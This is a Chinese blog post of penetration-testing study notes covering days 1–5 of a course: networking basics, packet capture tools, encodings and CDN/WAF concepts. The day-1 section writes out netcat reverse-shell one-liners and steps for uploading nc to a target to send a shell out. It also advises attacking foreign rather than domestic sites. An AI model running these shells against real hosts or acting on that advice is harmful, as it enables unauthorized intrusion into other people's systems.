href="#%E7%AC%AC%E4%B8%83%E5%8D%81%E4%B9%9D%E5%A4%A9-WAF%E6%94%BB%E9%98%B2-%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0-%E5%8D%8F%E8%AE%AE-%E4%BB%A3%E7%90%86%E6%B1%A0-Goby-AWVS-Xray"><span class="nav-number">78.</span> <span class="nav-text">第七十九天 WAF攻防-漏洞发现&amp;协议&amp;代理池&amp;Goby&amp;AWVS&amp;Xray</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9%EF%BC%9A-55"><span class="nav-number">78.0.0.1.</span> <span class="nav-text">知识点：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%BC%94%E7%A4%BA%E6%A1%88%E4%BE%8B%EF%BC%9A-49"><span class="nav-number">78.0.0.2.</span> <span class="nav-text">演示案例：</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%AC%AC%E5%85%AB%E5%8D%81%E5%A4%A9-WAF%E6%94%BB%E9%98%B2-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-HPP%E6%B1%A1%E6%9F%93-%E5%88%86%E5%9D%97%E4%BC%A0%E8%BE%93-%E5%9E%83%E5%9C%BE%E6%95%B0%E6%8D%AE"><span class="nav-number">79.</span> <span class="nav-text">第八十天 WAF攻防-漏洞利用&amp;HPP污染&amp;分块传输&amp;垃圾数据</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%8F%82%E8%80%83%E7%82%B9%EF%BC%9A"><span class="nav-number">79.0.0.1.</span> <span class="nav-text">参考点：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%BC%94%E7%A4%BA%E6%A1%88%E4%BE%8B%EF%BC%9A-50"><span class="nav-number">79.0.0.2.</span> <span class="nav-text">演示案例：</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%AC%AC122%E5%A4%A9%EF%BC%9A%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-%E5%BA%94%E7%94%A8%E7%BD%91%E7%BB%9C%E5%87%AD%E6%8D%AE-CS%E6%8F%92%E4%BB%B6-Adfind-BloodHound"><span class="nav-number">80.</span> <span class="nav-text">第122天：内网安全-域信息收集&amp;应用网络凭据&amp;CS插件&amp;Adfind&amp;BloodHound</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9%EF%BC%9A-56"><span class="nav-number">80.0.0.1.</span> <span class="nav-text">#知识点：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%BC%94%E7%A4%BA%E6%A1%88%E4%BE%8B%EF%BC%9A-51"><span class="nav-number">80.0.0.2.</span> <span class="nav-text">演示案例：</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%AC%AC123%E5%A4%A9%EF%BC%9A%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E9%98%B2%E7%81%AB%E5%A2%99-%E5%85%A5%E7%AB%99%E5%87%BA%E7%AB%99%E8%A7%84%E5%88%99-%E4%B8%8D%E5%87%BA%E7%BD%91%E9%9A%A7%E9%81%93%E4%B8%8A%E7%BA%BF-%E7%BB%84%E7%AD%96%E7%95%A5%E5%AF%B9%E8%B1%A1%E5%90%8C%E6%AD%A5"><span class="nav-number">81.</span> <span class="nav-text">第123天：内网安全-域防火墙&amp;入站出站规则&amp;不出网隧道上线&amp;组策略对象同步</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9%EF%BC%9A-57"><span class="nav-number">81.0.0.1.</span> <span class="nav-text">#知识点：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%B3%BB%E5%88%97%E7%82%B9%EF%BC%9A"><span class="nav-number">81.0.0.2.</span> <span class="nav-text">#系列点：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%BC%94%E7%A4%BA%E6%A1%88%E4%BE%8B%EF%BC%9A-52"><span class="nav-number">81.0.0.3.</span> <span class="nav-text">演示案例：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%8D%95%E6%9C%BA-%E9%98%B2%E7%81%AB%E5%A2%99-%E9%99%90%E5%88%B6%E7%AB%AF%E5%8F%A3%E5%87%BA%E5%85%A5%E7%AB%99"><span class="nav-number">81.0.0.4.</span> <span class="nav-text">#单机-防火墙-限制端口出入站</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%8D%95%E6%9C%BA-%E9%98%B2%E7%81%AB%E5%A2%99-%E9%99%90%E5%88%B6%E5%8D%8F%E8%AE%AE%E5%87%BA%E5%85%A5%E7%AB%99"><span class="nav-number">81.0.0.5.</span> <span class="nav-text">#单机-防火墙-限制协议出入站</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%9F%9F%E6%8E%A7-%E9%98%B2%E7%81%AB%E5%A2%99-%E7%BB%84%E7%AD%96%E7%95%A5%E5%AF%B9%E8%B1%A1%E5%90%8C%E6%AD%A5"><span class="nav-number">81.0.0.6.</span> <span class="nav-text">#域控-防火墙-组策略对象同步</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%AC%AC124%E5%A4%A9%EF%BC%9A%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E4%BB%A3%E7%90%86Socks%E5%8D%8F%E8%AE%AE-%E8%B7%AF%E7%94%B1%E4%B8%8D%E5%87%BA%E7%BD%91-%E5%90%8E%E6%B8%97%E9%80%8F%E9%80%9A%E8%AE%AF-CS-MSF%E6%8E%A7%E5%88%B6%E4%B8%8A%E7%BA%BF"><span class="nav-number">82.</span> <span class="nav-text">第124天：内网安全-代理Socks协议&amp;路由不出网&amp;后渗透通讯&amp;CS-MSF控制上线</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9%EF%BC%9A-58"><span class="nav-number">82.0.0.1.</span> <span class="nav-text">#知识点：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%B3%BB%E5%88%97%E7%82%B9%EF%BC%9A-1"><span class="nav-number">82.0.0.2.</span> <span class="nav-text">#系列点：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%BC%94%E7%A4%BA%E6%A1%88%E4%BE%8B%EF%BC%9A-53"><span class="nav-number">82.0.0.3.</span> <span class="nav-text">演示案例：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%BD%91%E7%BB%9C%E9%80%9A%E8%AE%AF-MSF-CS-%E8%B7%AF%E7%94%B1%E6%B7%BB%E5%8A%A0-%E8%8A%82%E7%82%B9%E5%BB%BA%E7%AB%8B"><span class="nav-number">82.0.0.4.</span> <span class="nav-text">#网络通讯-MSF&amp;CS-路由添加&amp;节点建立</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%8E%A7%E5%88%B6%E4%B8%8A%E7%BA%BF-MSF-CS-%E5%8D%8F%E8%AE%AE%E7%94%9F%E6%88%90-%E6%AD%A3%E5%8F%8D%E8%BF%9E%E6%8E%A5"><span class="nav-number">82.0.0.5.</span> <span class="nav-text">#控制上线-MSF&amp;CS-协议生成&amp;正反连接</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%AC%AC125%E5%A4%A9%EF%BC%9A%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF-SMB-ICMP-%E6%AD%A3%E5%8F%8D%E5%90%91%E8%BF%9E%E6%8E%A5-%E9%98%B2%E7%81%AB%E5%A2%99%E5%87%BA%E5%85%A5%E8%A7%84%E5%88%99%E4%B8%8A%E7%BA%BF"><span class="nav-number">83.</span> <span class="nav-text">第125天：内网安全-隧道技术&amp;SMB&amp;ICMP&amp;正反向连接&amp;防火墙出入规则上线</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9%EF%BC%9A-59"><span class="nav-number">83.0.0.1.</span> <span class="nav-text">#知识点：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%B3%BB%E5%88%97%E7%82%B9%EF%BC%9A-2"><span class="nav-number">83.0.0.2.</span> <span class="nav-text">#系列点：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%BC%94%E7%A4%BA%E6%A1%88%E4%BE%8B%EF%BC%9A-54"><span class="nav-number">83.0.0.3.</span> <span class="nav-text">演示案例：</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%AC%AC126%E5%A4%A9%EF%BC%9A%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF-SSH-DNS-ICMP-SMB-%E4%B8%8A%E7%BA%BF%E9%80%9A%E8%AE%AFLinux-Mac"><span class="nav-number">84.</span> <span class="nav-text">第126天：内网安全-隧道技术&amp;SSH&amp;DNS&amp;ICMP&amp;SMB&amp;上线通讯Linux&amp;Mac</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9%EF%BC%9A-60"><span class="nav-number">84.0.0.1.</span> <span class="nav-text">#知识点：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%B3%BB%E5%88%97%E7%82%B9%EF%BC%9A-3"><span class="nav-number">84.0.0.2.</span> <span class="nav-text">#系列点：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%BC%94%E7%A4%BA%E6%A1%88%E4%BE%8B%EF%BC%9A-55"><span class="nav-number">84.0.0.3.</span> <span class="nav-text">演示案例：</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%AC%AC127%E5%A4%A9%EF%BC%9A%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E9%9A%A7%E9%81%93%E6%90%AD%E5%BB%BA-%E7%A9%BF%E9%80%8F%E4%B8%8A%E7%BA%BF-FRP-NPS-SPP-Ngrok-EW%E9%A1%B9%E7%9B%AE"><span class="nav-number">85.</span> <span class="nav-text">第127天：内网安全-隧道搭建&amp;穿透上线&amp;FRP&amp;NPS&amp;SPP&amp;Ngrok&amp;EW项目</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9%EF%BC%9A-61"><span class="nav-number">85.0.0.1.</span> <span class="nav-text">#知识点：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%B3%BB%E5%88%97%E7%82%B9%EF%BC%9A-4"><span class="nav-number">85.0.0.2.</span> <span class="nav-text">#系列点：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%BC%94%E7%A4%BA%E6%A1%88%E4%BE%8B%EF%BC%9A-56"><span class="nav-number">85.0.0.3.</span> <span class="nav-text">演示案例：</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%AC%AC128%E5%A4%A9%EF%BC%9A%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8-IPC-AT-SC%E5%91%BD%E4%BB%A4-Impacket%E5%A5%97%E4%BB%B6-CS%E6%8F%92%E4%BB%B6-%E5%85%A8%E8%87%AA%E5%8A%A8"><span class="nav-number">86.</span> <span class="nav-text">第128天：内网安全-横向移动&amp;IPC&amp;AT&amp;SC命令&amp;Impacket套件&amp;CS插件&amp;全自动</span></a></li></ol></div>
        </div>
        <!--/noindex-->

        <div class="site-overview-wrap sidebar-panel">
          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="6pc1"
      src="/images/avatar.png">
  <p class="site-author-name" itemprop="name">6pc1</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap animated">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
        <a href="/archives/">
          <span class="site-state-item-count">11</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
          <a href="/categories/">
        <span class="site-state-item-count">7</span>
        <span class="site-state-item-name">分类</span></a>
      </div>
      <div class="site-state-item site-state-tags">
          <a href="/tags/">
        <span class="site-state-item-count">12</span>
        <span class="site-state-item-name">标签</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author animated">
      <span class="links-of-author-item">
        <a href="https://github.com/6pc1" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;6pc1" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
      </span>
      <span class="links-of-author-item">
        <a href="mailto:2961816476@qq.com" title="E-Mail → mailto:2961816476@qq.com" rel="noopener me" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
      </span>
      <span class="links-of-author-item">
        <a href="https://qm.qq.com/q/uZSUzwBesa" title="QQ → https:&#x2F;&#x2F;qm.qq.com&#x2F;q&#x2F;uZSUzwBesa" rel="noopener me" target="_blank"><i class="fab fa-qq fa-fw"></i>QQ</a>
      </span>
  </div>

        </div>
      </div>
    </div>

    
    <div class="sidebar-inner sidebar-blogroll">
      <div class="links-of-blogroll animated">
        <div class="links-of-blogroll-title"><i class="fa fa-globe fa-fw"></i>
          链接
        </div>
        <ul class="links-of-blogroll-list">
            <li class="links-of-blogroll-item">
              <a href="https://hacbit.tech/" title="https:&#x2F;&#x2F;hacbit.tech&#x2F;" rel="noopener" target="_blank">hacbit</a>
            </li>
            <li class="links-of-blogroll-item">
              <a href="https://yixinbc.tech/" title="https:&#x2F;&#x2F;yixinbc.tech&#x2F;" rel="noopener" target="_blank">yixinBC</a>
            </li>
            <li class="links-of-blogroll-item">
              <a href="http://clearwine.online/" title="http:&#x2F;&#x2F;clearwine.online" rel="noopener" target="_blank">qinjiu</a>
            </li>
        </ul>
      </div>
    </div>
  </aside>


    </div>

    <div class="main-inner post posts-expand">


  


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://6pc1.github.io/2023/11/28/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.png">
      <meta itemprop="name" content="6pc1">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="6pc1's blog">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="渗透测试学习之路 | 6pc1's blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          渗透测试学习之路
        </h1>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2023-11-28 19:35:52" itemprop="dateCreated datePublished" datetime="2023-11-28T19:35:52+08:00">2023-11-28</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">更新于</span>
      <time title="修改时间：2024-05-11 09:28:51" itemprop="dateModified" datetime="2024-05-11T09:28:51+08:00">2024-05-11</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/Web/" itemprop="url" rel="index"><span itemprop="name">Web</span></a>
        </span>
    </span>

  
    <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv">
      <span class="post-meta-item-icon">
        <i class="far fa-eye"></i>
      </span>
      <span class="post-meta-item-text">阅读次数：</span>
      <span id="busuanzi_value_page_pv"></span>
    </span>
  
  <span class="post-meta-item">
    
    <span class="post-meta-item-icon">
      <i class="far fa-comment"></i>
    </span>
    <span class="post-meta-item-text">Waline：</span>
  
    <a title="waline" href="/2023/11/28/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF/#waline" itemprop="discussionUrl">
      <span class="post-comments-count waline-comment-count" data-path="/2023/11/28/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF/" itemprop="commentCount"></span>
    </a>
  </span>
  
  
    <span class="post-meta-break"></span>
    <span class="post-meta-item" title="本文字数">
      <span class="post-meta-item-icon">
        <i class="far fa-file-word"></i>
      </span>
      <span class="post-meta-item-text">本文字数：</span>
      <span>61k</span>
    </span>
    <span class="post-meta-item" title="阅读时长">
      <span class="post-meta-item-icon">
        <i class="far fa-clock"></i>
      </span>
      <span class="post-meta-item-text">阅读时长 &asymp;</span>
      <span>55 分钟</span>
    </span>
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody"><p>已经决定了准备暑假看看去找个实习，对于web手来说，渗透肯定是必不可少的，所以从现在开始，也要抓紧时间去好好学下渗透的相关知识了。</p>
<span id="more"></span>

<h1 id="1、第1天：基础入门-操作系统-名词-文件下载-反弹SHELL-防火墙绕过"><a href="#1、第1天：基础入门-操作系统-名词-文件下载-反弹SHELL-防火墙绕过" class="headerlink" title="1、第1天：基础入门-操作系统&amp;名词&amp;文件下载&amp;反弹SHELL&amp;防火墙绕过"></a>1、第1天：基础入门-操作系统&amp;名词&amp;文件下载&amp;反弹SHELL&amp;防火墙绕过</h1><blockquote>
<p>一些参考的资料工具网站</p>
<p>渗透常见术语<a target="_blank" rel="noopener" href="https://www.cnblogs.com/sunny11/p/13583083.html">https://www.cnblogs.com/sunny11/p/13583083.html</a></p>
<p>菱角社区：<a target="_blank" rel="noopener" href="https://forum.ywhack.com/bountytips.php?download">https://forum.ywhack.com/bountytips.php?download</a></p>
<p>反弹shell：<a target="_blank" rel="noopener" href="https://forum.ywhack.com/reverse-shell/">https://forum.ywhack.com/reverse-shell/</a></p>
<p>常见命令：<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_43303273/article/details/83029138">https://blog.csdn.net/weixin_43303273/article/details/83029138</a></p>
</blockquote>
<h2 id="1、内网与外网的区别"><a href="#1、内网与外网的区别" class="headerlink" title="1、内网与外网的区别"></a>1、内网与外网的区别</h2><p>外网就是正常我们使用的服务器那种的，我们可以直接通过ip地址去访问，而内网则是在一小范围中使用的，无法直接通过其ip地址去直接找到，这个时候我们只能通过建立通道或者端口指定从而去指定到我们需要访问的内网，就比如虚拟机的ip，就相当于一个内网地址。</p>
<h2 id="2、出网和进网"><a href="#2、出网和进网" class="headerlink" title="2、出网和进网"></a>2、出网和进网</h2><p>Windows的防火墙对于出网限制很少，而对于进网则有着很大的限制。</p>
<p>所以在一般情况下，我们使用带有防火墙的主机去将cmd权限发出，使用没有防火墙的主机去连接，防火墙这样就不会起到阻拦的作用了。</p>
<h2 id="3、反弹shell"><a href="#3、反弹shell" class="headerlink" title="3、反弹shell"></a>3、反弹shell</h2><blockquote>
<p>Windows：nc -e cmd ip port</p>
<p>Linux:   nc -e &#x2F;bin&#x2F;bash ip port</p>
</blockquote>
<p>内网可以连接外网，外网无法去连接内网。</p>
<h2 id="4、实战"><a href="#4、实战" class="headerlink" title="4、实战"></a>4、实战</h2><p>①将cmd上传至目标服务器</p>
<p>②将cmd权限发出，并使用外网主机接受</p>
<p>③拿到权限，从而去完成渗透</p>
<p>例子：Pikachu靶场的攻破</p>
<p>1、信息收集，寻找目标</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-04-04/0f5af17a529d67961e925aa6be75884d--b4a3--image-20240404103555177.png" alt="image-20240404103555177"></p>
<p>这边给个小建议，别打国内的，最好国外的</p>
<p>2、判断是否有攻击利用的条件</p>
<p>（实在是现在找不到了，大部分已经都完全修复了）</p>
<p>3、最后就是远程下载nc，并将shell发出去，这样就拿到了权限。</p>
<h1 id="2、第2天：基础入门-Web应用-架构搭建-漏洞-HTTP数据包-代理服务器"><a href="#2、第2天：基础入门-Web应用-架构搭建-漏洞-HTTP数据包-代理服务器" class="headerlink" title="2、第2天：基础入门-Web应用&amp;架构搭建&amp;漏洞&amp;HTTP数据包&amp;代理服务器"></a>2、第2天：基础入门-Web应用&amp;架构搭建&amp;漏洞&amp;HTTP数据包&amp;代理服务器</h1><h2 id="1、网站的开发"><a href="#1、网站的开发" class="headerlink" title="1、网站的开发"></a>1、网站的开发</h2><p>这里也就是一些基础的web知识了，学会去购买服务器，域名等，并且以此去搭建一个自己的博客项目，这样也能去更好的理解一下网站的结构等相关知识。在这里就不过多的去讲解了，这都可以自己跟着网上的资料去学习的。</p>
<h2 id="2、web应用框架"><a href="#2、web应用框架" class="headerlink" title="2、web应用框架"></a>2、web应用框架</h2><p>理解不同WEB应用组成角色功能架构：</p>
<p>开发语言，程序源码，中间件容器，数据库类型，服务器操作系统，第三方软件等。</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2023-11-29/e0c18ac5a06e048e519805fbc591a642--032f--image-20231129155607968.png" alt="image-20231129155607968"></p>
<h2 id="3、代理以及抓包"><a href="#3、代理以及抓包" class="headerlink" title="3、代理以及抓包"></a>3、代理以及抓包</h2><p>可以使用bp去实现抓到请求包，并且去修改从而达到我们想要的效果。</p>
<p>然后就是可以根据响应包的状态码去判断状态。</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2023-11-29/f9ff913739a0803b75f280912eff5134--c28f--image-20231129155736090.png" alt="image-20231129155736090"></p>
<h2 id="4、代理购买的作用"><a href="#4、代理购买的作用" class="headerlink" title="4、代理购买的作用"></a>4、代理购买的作用</h2><p>在网上去购买代理，就可以实现每次点击网站使用的就是不同的ip地址，这样就能去防止自身的ip被拉入黑名单后无法访问的问题。购买代理就像是在主机和被访问服务器之间新增了一个代理服务器，由这个服务器把你的请求拦截并由它发出，最后接收到的返回包也由它经手返回</p>
<h1 id="第3天：基础入门-抓包-封包-协议-APP-小程序-PC应-WEB应用"><a href="#第3天：基础入门-抓包-封包-协议-APP-小程序-PC应-WEB应用" class="headerlink" title="第3天：基础入门-抓包&amp;封包&amp;协议&amp;APP&amp;小程序&amp;PC应&amp;WEB应用"></a>第3天：基础入门-抓包&amp;封包&amp;协议&amp;APP&amp;小程序&amp;PC应&amp;WEB应用</h1><h2 id="1、重点总结"><a href="#1、重点总结" class="headerlink" title="1、重点总结"></a>1、重点总结</h2><p>①为什么要抓包？ -抓包应用的资产信息进行安全测试</p>
<p>②抓包的对象有哪些？ -小程序，APP，桌面应用等</p>
<p>③抓包协议区别工具？ -有部分应用不走HTTP&#x2F;S，需要用到全局协议抓包</p>
<p>④封包和抓包不同之处？  -零散整体的区别，封包能精确到每一个操作的数据包。</p>
<h2 id="2、手机APP、小程序的抓包"><a href="#2、手机APP、小程序的抓包" class="headerlink" title="2、手机APP、小程序的抓包"></a>2、手机APP、小程序的抓包</h2><p>使用bp，Charles去抓包，小程序的话不方便使用bp，使用Charles更加方便。</p>
<p>bp抓包能够精准定位到每一次数据包的发送。</p>
<h2 id="3、全局协议抓包"><a href="#3、全局协议抓包" class="headerlink" title="3、全局协议抓包"></a>3、全局协议抓包</h2><p>可以去使用科来或者wireshark去抓包，直接对全局进行抓包，并不只局限于HTTP数据包，可以更方便的用于对一些应用的抓包。</p>
<h2 id="4、封包"><a href="#4、封包" class="headerlink" title="4、封包"></a>4、封包</h2><p>这里就可以去使用一个封包监听工具，可以去监听某个进程的数据包并且进行封包，封包的话就是可以将某种行为包装成一个数据包，我们就可以重新去发送这个数据包去重复某种行为，更加精确。这就很方便于对于游戏外挂相关的制作。</p>
<h2 id="5、相关软件的介绍"><a href="#5、相关软件的介绍" class="headerlink" title="5、相关软件的介绍"></a>5、相关软件的介绍</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">#参考点： Fiddder: 是一个http协议调试代理工具，它能够记录并检查所有你的电脑和互联网之间的http通讯，设置断点，查看所有的&quot;进出&quot;Fiddler的数据（指cookie,html,j3,css等文件）。Fiddler要比其他的网络调试器要更加简单，因为它不仅仅暴露ttp通讯还提供了一个用户友好的格式。</span><br><span class="line">Charles:</span><br><span class="line">是一个HTTP代理服务器，HTTP监视器，反转代理服务器，当浏览器连接Charles的代理访问互联网时，char1es可以监控浏览器发送和接收的所有数据。它允许一个开发者查看所有连接互联网的HTTP通信，这些包括cequest,respon3e和HTTP headers(包含cookies.与caching信息）</span><br><span class="line">TCPDump:</span><br><span class="line">是可以将网络中传送的数据包完全截获下来提供分析。它支持针对网络层、协</span><br><span class="line">议、主机、网络或端口的过滤，并提供and、or、not等逻辑语句来帮助你去掉无用的信息。</span><br><span class="line">BurpSuite:</span><br><span class="line">是用于攻击web应用程序的集成平台，包含了许多工具。Burp Suitei为这些工具设计了许多接口，以加快攻击应用程序的过程。所有工具都共享一个请求，并能处理对应的HTTP消息、持久性、认证、代理、日志、警报。</span><br><span class="line">Wireshark:</span><br><span class="line">是一个网络封包分析软件。网络封包分析软件的功能是截取网络封包，并尽</span><br><span class="line">可能显示出最为详细的网络封包资料。Wireshark使用WinPCAP作为接口，直接与网卡进</span><br><span class="line">行数据报文交换。</span><br><span class="line">科来网络分析系统：是一款由科来软件全自主研发，并拥有全部知识产品的网络分析产</span><br><span class="line">品。该系统具有行业领先的专家分析技术，通过捕获并分析网络中传输的底层数据包，对</span><br><span class="line">网络故障、网络安全以及网络性能进行全面分析，从而快速排查网络中出现或潜在的故</span><br><span class="line">障、安全及性能问题。</span><br><span class="line">WPE&amp;封包分析：是强大的网络封包编辑器，we可以截取网络上的信息，修改封包数据</span><br><span class="line">是外挂制作的常用工具。一般在安全测试中可用来调试数据通讯地址。</span><br></pre></td></tr></table></figure>

<h1 id="第4天：基础入门-30余种加密编码进制-Web-数据库-系统-代码-参数值"><a href="#第4天：基础入门-30余种加密编码进制-Web-数据库-系统-代码-参数值" class="headerlink" title="第4天：基础入门-30余种加密编码进制&amp;Web&amp;数据库&amp;系统&amp;代码&amp;参数值"></a>第4天：基础入门-30余种加密编码进制&amp;Web&amp;数据库&amp;系统&amp;代码&amp;参数值</h1><p>今天讲的这个就是属于很基础的一部分了，都是相关加密解密的，作为一个ctf选手这方面了解的也算挺多的，所以也就不过多去讲解了。</p>
<h2 id="1、文件加密"><a href="#1、文件加密" class="headerlink" title="1、文件加密"></a>1、文件加密</h2><p>通过各种语言自身的加密方式，对源代码进行加密，从而达到数据保护的功能。</p>
<p>dll加密、php加密、SQL加密、jar加密</p>
<h2 id="2、对编码的观察"><a href="#2、对编码的观察" class="headerlink" title="2、对编码的观察"></a>2、对编码的观察</h2><p>需要去熟悉一些加解密的相应特征，并且要求能够在碰见一些加密后的数据后能够去判断出加密方法并且对之进行解密。</p>
<h2 id="3、总结"><a href="#3、总结" class="headerlink" title="3、总结"></a>3、总结</h2><p>其实CTF中这些就是主要考点，各种像base系列，aes，md5等各种形式的加解密，这种都能够在网上去搜到相关的加解密方案的。</p>
<h1 id="第5天：基础入门-资产架构-端口-应用-CDN-WAF-站库分离-负载均衡"><a href="#第5天：基础入门-资产架构-端口-应用-CDN-WAF-站库分离-负载均衡" class="headerlink" title="第5天：基础入门-资产架构&amp;端口&amp;应用&amp;CDN&amp;WAF&amp;站库分离&amp;负载均衡"></a>第5天：基础入门-资产架构&amp;端口&amp;应用&amp;CDN&amp;WAF&amp;站库分离&amp;负载均衡</h1><h2 id="1、CDN和负载均衡"><a href="#1、CDN和负载均衡" class="headerlink" title="1、CDN和负载均衡"></a>1、CDN和负载均衡</h2><p>CDN是购买结点，从而去达到工具服务器的作用，从而可以加速访问国外网站的作用，并且可以在被攻打时无法找到真正的网站服务器。</p>
<p>负载均衡时自身使用多台服务器，在访问的时候去随机访问一台服务器，从而也能起到防止渗透的作用。</p>
<h2 id="2、web安全问题"><a href="#2、web安全问题" class="headerlink" title="2、web安全问题"></a>2、web安全问题</h2><p>目录站点</p>
<p>端口站点</p>
<p>ip站点</p>
<p>服务器站点</p>
<p>站点插件</p>
<h2 id="3、番外安全问题"><a href="#3、番外安全问题" class="headerlink" title="3、番外安全问题"></a>3、番外安全问题</h2><p>域名注册商</p>
<p>服务器厂商</p>
<p>管理人员安全</p>
<h2 id="4、一些阻碍"><a href="#4、一些阻碍" class="headerlink" title="4、一些阻碍"></a>4、一些阻碍</h2><p>站库分离</p>
<p>CDN加速服务</p>
<p>负载均衡服务</p>
<p>WAF应用防火墙</p>
<p>主机防护防火墙</p>
